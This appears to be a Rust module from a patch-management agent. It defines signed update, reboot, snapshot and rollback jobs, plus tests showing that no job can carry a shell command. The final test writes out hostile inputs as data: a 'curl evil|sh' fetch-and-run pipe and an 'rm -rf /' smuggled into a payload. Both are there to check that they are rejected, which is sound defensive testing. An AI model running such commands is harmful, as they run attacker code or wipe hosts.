//! Jobs: the closed set of things the server may ask an agent to do.
//!
//! [`JobSpec`] is exhaustive. There is no variant carrying a script, a command
//! line, or a free-form string for the agent to run. Every job names *what*
//! should happen with explicit parameters, never *how*. That is what makes
//! "even full control of the control plane cannot run commands on a customer
//! host" a property of the type system rather than a promise in a document.
//!
//! Adding a variant here is a security decision.

use crate::{
    ids::{HostId, JobId, SigningKeyId},
    sign::SignaturePurpose,
};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

/// Which operation a job performs. Kept separate from [`JobSpec`] because the
/// agent's permission checks and the server's metrics both want the discriminant
/// without the payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum JobKind {
    RefreshInventory,
    RunPreflight,
    ApplyUpdates,
    DistUpgrade,
    Reboot,
    Snapshot,
    Rollback,
    SelfUpdate,
}

impl JobKind {
    /// Every kind there is.
    ///
    /// For the callers that have to enumerate them — the agent turning its
    /// `[permissions]` table into the list it reports (DAWG-223), and the
    /// server deciding what it may ask of a host. **Adding a variant means
    /// adding it here**, and a variant missing from this array is a permission
    /// the agent silently never reports.
    pub const ALL: [Self; 8] = [
        Self::RefreshInventory,
        Self::RunPreflight,
        Self::ApplyUpdates,
        Self::DistUpgrade,
        Self::Reboot,
        Self::Snapshot,
        Self::Rollback,
        Self::SelfUpdate,
    ];

    /// Whether this job changes the host. Observe mode refuses all of these.
    #[must_use]
    pub const fn is_mutating(self) -> bool {
        !matches!(self, Self::RefreshInventory | Self::RunPreflight)
    }

    /// The permission name checked against `[permissions]` in `agent.toml`.
    #[must_use]
    pub const fn permission(self) -> &'static str {
        match self {
            Self::RefreshInventory => "refresh",
            Self::RunPreflight => "preflight",
            Self::ApplyUpdates => "apply_patch",
            Self::DistUpgrade => "dist_upgrade",
            Self::Reboot => "reboot",
            Self::Snapshot | Self::Rollback => "snapshot",
            Self::SelfUpdate => "self_update",
        }
    }
}

/// An exact package version to install.
///
/// Exact, not "whatever is newest". If the host's candidate has moved on since
/// the change was approved, the agent refuses the job rather than installing
/// something nobody reviewed.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PackagePin {
    pub name: String,
    pub arch: String,
    /// Version the server believes is installed.
    pub from: String,
    /// Version to install. Must match the host's candidate exactly.
    pub to: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SnapshotPolicy {
    #[default]
    Never,
    /// Take one if a provider is available, carry on if not.
    IfAvailable,
    /// Fail the job rather than proceed without a snapshot.
    Required,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RebootPolicy {
    #[default]
    Never,
    /// Only if the host says one is required.
    IfRequired,
    Always,
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct ApplyUpdates {
    pub packages: Vec<PackagePin>,
    #[serde(default)]
    pub snapshot: SnapshotPolicy,
    #[serde(default)]
    pub reboot: RebootPolicy,
    /// Hard timeout. Package managers occasionally wedge, and a job that never
    /// finishes blocks every other job on the host.
    #[serde(default = "default_timeout")]
    pub timeout_s: u64,
}

const fn default_timeout() -> u64 {
    3600
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DistUpgrade {
    /// Target release, e.g. `24.04` or `13`.
    pub target_release: String,
    #[serde(default)]
    pub snapshot: SnapshotPolicy,
    #[serde(default)]
    pub reboot: RebootPolicy,
    #[serde(default = "default_dist_timeout")]
    pub timeout_s: u64,
}

const fn default_dist_timeout() -> u64 {
    14_400
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct Reboot {
    #[serde(default)]
    pub policy: RebootPolicy,
    /// Delay before rebooting, so a wall message has time to be read.
    #[serde(default)]
    pub delay_s: u64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct Preflight {
    /// Checking a dist-upgrade rather than a package change.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub target_release: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub packages: Vec<PackagePin>,
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct Snapshot {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Rollback {
    /// Provider-qualified snapshot identifier, e.g. `snapper:412`.
    pub snapshot_id: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SelfUpdate {
    pub version: String,
    pub channel: crate::releases::ReleaseChannel,
}

/// What a job actually is.
///
/// Serialises as `{"kind": "...", "payload": {...}}`, matching the wire format.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", content = "payload", rename_all = "snake_case")]
pub enum JobSpec {
    RefreshInventory,
    RunPreflight(Preflight),
    ApplyUpdates(ApplyUpdates),
    DistUpgrade(DistUpgrade),
    Reboot(Reboot),
    Snapshot(Snapshot),
    Rollback(Rollback),
    SelfUpdate(SelfUpdate),
}

impl JobSpec {
    #[must_use]
    pub const fn kind(&self) -> JobKind {
        match self {
            Self::RefreshInventory => JobKind::RefreshInventory,
            Self::RunPreflight(_) => JobKind::RunPreflight,
            Self::ApplyUpdates(_) => JobKind::ApplyUpdates,
            Self::DistUpgrade(_) => JobKind::DistUpgrade,
            Self::Reboot(_) => JobKind::Reboot,
            Self::Snapshot(_) => JobKind::Snapshot,
            Self::Rollback(_) => JobKind::Rollback,
            Self::SelfUpdate(_) => JobKind::SelfUpdate,
        }
    }
}

/// A signed instruction for exactly one host.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Job {
    pub id: JobId,
    pub host_id: HostId,
    #[serde(flatten)]
    pub spec: JobSpec,
    /// Earliest the agent may start. Used for maintenance windows.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub not_before: Option<DateTime<Utc>>,
    pub expires_at: DateTime<Utc>,
    /// Which organization key signed this.
    pub key_id: SigningKeyId,
    /// Base64 Ed25519 signature over [`Job::signing_bytes`].
    pub signature: String,
}

impl Job {
    #[must_use]
    pub const fn kind(&self) -> JobKind {
        self.spec.kind()
    }

    /// The canonical document: this job's JSON with `signature` removed.
    ///
    /// This is the thing the server stores and delivers verbatim (DAWG-209).
    /// Both sides must agree byte-for-byte or nothing verifies, so the rule
    /// lives here rather than being reimplemented in the signer and the agent.
    /// `serde_json` orders object keys deterministically, which is what makes
    /// this canonical.
    pub fn document(&self) -> Result<Vec<u8>, serde_json::Error> {
        let mut value = serde_json::to_value(self)?;
        if let Some(obj) = value.as_object_mut() {
            obj.remove("signature");
        }
        serde_json::to_vec(&value)
    }

    /// The exact bytes a signature covers: the document under
    /// [`SignaturePurpose::Job`].
    ///
    /// ⚠️ **Changed in 0.3, and the change is silent at the type level.** Before
    /// 0.3 this returned the document alone, and job signatures were told apart
    /// from endorsements only by the fact that a job document starts with `{`.
    /// The label is now part of what is signed; see [`SignaturePurpose`].
    ///
    /// Signing and verifying both go through here, so neither side can forget
    /// the label. Reach for [`Job::document`] only when you want the bytes to
    /// store or to compare, never to sign or to verify.
    pub fn signing_bytes(&self) -> Result<Vec<u8>, serde_json::Error> {
        Ok(SignaturePurpose::Job.bytes_to_sign(&self.document()?))
    }
}

/// `POST /agent/v1/jobs/{job_id}/ack`
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct JobAck {
    pub accepted: bool,
    /// Why the host refused. Required when `accepted` is false.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub rejection_reason: Option<String>,
    pub at: DateTime<Utc>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum JobStatus {
    Succeeded,
    Failed,
    /// Local configuration forbade it. A normal outcome, not an error — the
    /// agent is meant to be able to say no.
    RejectedByHost,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PackageChange {
    pub name: String,
    pub arch: String,
    pub from: String,
    pub to: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct HealthCheckReport {
    pub name: String,
    pub passed: bool,
    pub duration_ms: u64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub detail: Option<String>,
}

/// `POST /agent/v1/jobs/{job_id}/complete`
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct JobComplete {
    pub status: JobStatus,
    pub started_at: DateTime<Utc>,
    pub finished_at: DateTime<Utc>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub snapshot_id: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub changes: Vec<PackageChange>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub health_checks: Vec<HealthCheckReport>,
    pub reboot_required: bool,
    /// Hash of the inventory after the job, so the server knows whether what it
    /// holds is now stale.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub inventory_hash: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
    /// What a `run_preflight` job found (DAWG-147), one entry per check.
    /// Empty for every other kind.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub preflight: Vec<PreflightCheck>,
}

/// One preflight check's answer: whether the change can go ahead as far as
/// this check can tell, and why (DAWG-147).
///
/// A check that could not run says so as a `warn` with the reason, never as
/// a `pass`: "could not look" is not "looked and it is fine".
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PreflightCheck {
    /// Stable, for code: `disk_space`, `held_packages`, `modified_conffiles`,
    /// `dkms_modules`, `snapshot`, `reboot`.
    pub name: String,
    pub status: CheckStatus,
    /// One sentence for a person, saying what to do when it is not a pass.
    pub summary: String,
    /// The specifics, one per entry: a package, a file, a module. Structured
    /// so a portal can list them rather than parse a sentence.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub items: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CheckStatus {
    Pass,
    /// Worth a person's attention; not a reason to stop on its own.
    Warn,
    /// The change should not go ahead until this is dealt with.
    Fail,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_job() -> Job {
        Job {
            id: JobId::new("job_01J9ZD"),
            host_id: HostId::new("hst_webprod01"),
            spec: JobSpec::ApplyUpdates(ApplyUpdates {
                packages: vec![PackagePin {
                    name: "openssl".into(),
                    arch: "amd64".into(),
                    from: "3.0.13-0ubuntu3.3".into(),
                    to: "3.0.13-0ubuntu3.4".into(),
                }],
                snapshot: SnapshotPolicy::IfAvailable,
                reboot: RebootPolicy::Never,
                timeout_s: 3600,
            }),
            not_before: None,
            expires_at: "2026-09-22T04:00:00Z".parse().unwrap(),
            key_id: SigningKeyId::new("sk_01J8"),
            signature: "base64signature".into(),
        }
    }

    #[test]
    fn a_job_serialises_with_kind_and_payload_side_by_side() {
        let json = serde_json::to_value(sample_job()).unwrap();
        assert_eq!(json["kind"], "apply_updates");
        assert_eq!(json["payload"]["packages"][0]["name"], "openssl");
        assert_eq!(json["payload"]["snapshot"], "if_available");
    }

    #[test]
    fn a_job_round_trips() {
        let job = sample_job();
        let json = serde_json::to_string(&job).unwrap();
        let back: Job = serde_json::from_str(&json).unwrap();
        assert_eq!(job, back);
    }

    #[test]
    fn the_document_excludes_the_signature_and_nothing_else() {
        let job = sample_job();
        let bytes = job.document().unwrap();
        let value: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        assert!(
            value.get("signature").is_none(),
            "signature must not be covered by itself"
        );
        assert_eq!(value["id"], "job_01J9ZD");
        assert_eq!(value["kind"], "apply_updates");
        assert_eq!(value["expires_at"], "2026-09-22T04:00:00Z");
    }

    /// The 0.3 change, asserted on the bytes rather than on the call: what is
    /// signed is the document behind the job label, and the document itself is
    /// still what gets stored and delivered.
    #[test]
    fn signing_bytes_are_the_document_under_the_job_label() {
        let job = sample_job();
        assert_eq!(
            job.signing_bytes().unwrap(),
            SignaturePurpose::Job.bytes_to_sign(&job.document().unwrap())
        );
        assert!(job.signing_bytes().unwrap().starts_with(b"updawg-job-v1\0"));
    }

    /// ⚠️ The whole point of the label. A job document, offered as an
    /// endorsement, must not produce the same bytes — otherwise a signature
    /// over one is a signature over the other.
    #[test]
    fn a_job_cannot_be_presented_as_an_endorsement() {
        let job = sample_job();
        let document = job.document().unwrap();
        assert_ne!(
            job.signing_bytes().unwrap(),
            SignaturePurpose::Endorsement.bytes_to_sign(&document)
        );
    }

    #[test]
    fn signing_bytes_are_stable_across_calls() {
        let job = sample_job();
        assert_eq!(job.signing_bytes().unwrap(), job.signing_bytes().unwrap());
    }

    /// Changing the signature must not change what was signed, or an attacker
    /// could alter a job and re-derive a matching payload.
    #[test]
    fn signing_bytes_ignore_changes_to_the_signature_field() {
        let a = sample_job();
        let mut b = sample_job();
        b.signature = "a completely different signature".into();
        assert_eq!(a.signing_bytes().unwrap(), b.signing_bytes().unwrap());
    }

    #[test]
    fn changing_a_package_version_changes_what_is_signed() {
        let a = sample_job();
        let mut b = sample_job();
        if let JobSpec::ApplyUpdates(ref mut p) = b.spec {
            p.packages[0].to = "3.0.13-0ubuntu3.99".into();
        }
        assert_ne!(a.signing_bytes().unwrap(), b.signing_bytes().unwrap());
    }

    #[test]
    fn the_kind_discriminant_matches_the_spec() {
        assert_eq!(sample_job().kind(), JobKind::ApplyUpdates);
        assert_eq!(JobSpec::RefreshInventory.kind(), JobKind::RefreshInventory);
    }

    #[test]
    fn read_only_jobs_are_not_mutating() {
        assert!(!JobKind::RefreshInventory.is_mutating());
        assert!(!JobKind::RunPreflight.is_mutating());
        for kind in [
            JobKind::ApplyUpdates,
            JobKind::DistUpgrade,
            JobKind::Reboot,
            JobKind::Snapshot,
            JobKind::Rollback,
            JobKind::SelfUpdate,
        ] {
            assert!(kind.is_mutating(), "{kind:?} should be mutating");
        }
    }

    /// A payload naming a shell command must not deserialise into anything.
    /// This is the closed-set property, asserted rather than assumed.
    #[test]
    fn all_holds_every_kind_exactly_once() {
        let distinct: std::collections::BTreeSet<&str> =
            JobKind::ALL.iter().map(|k| k.permission()).collect();
        // Snapshot and Rollback share a permission, so the permissions are one
        // fewer than the kinds. Counted rather than assumed, because the number
        // is what catches a variant pasted in twice.
        assert_eq!(JobKind::ALL.len(), 8);
        assert_eq!(distinct.len(), 7);
        for kind in JobKind::ALL {
            // Exhaustive: a new variant does not compile until it is named
            // here, which is the nudge to put it in `ALL` as well.
            let named = match kind {
                JobKind::RefreshInventory => "refresh_inventory",
                JobKind::RunPreflight => "run_preflight",
                JobKind::ApplyUpdates => "apply_updates",
                JobKind::DistUpgrade => "dist_upgrade",
                JobKind::Reboot => "reboot",
                JobKind::Snapshot => "snapshot",
                JobKind::Rollback => "rollback",
                JobKind::SelfUpdate => "self_update",
            };
            // And the same words serde uses, so a rename shows up here too.
            assert_eq!(
                serde_json::to_string(&kind).unwrap(),
                format!("\"{named}\"")
            );
        }
    }

    #[test]
    fn there_is_no_variant_that_carries_a_command() {
        let attempt =
            r#"{"kind":"run_command","payload":{"argv":["/bin/sh","-c","curl evil|sh"]}}"#;
        assert!(serde_json::from_str::<JobSpec>(attempt).is_err());

        // Nor can a known kind be given an executable payload.
        let smuggle = r#"{"kind":"apply_updates","payload":{"command":"rm -rf /"}}"#;
        let parsed: Result<JobSpec, _> = serde_json::from_str(smuggle);
        if let Ok(JobSpec::ApplyUpdates(p)) = parsed {
            assert!(
                p.packages.is_empty(),
                "unknown payload fields must not become instructions"
            );
        }
    }
}
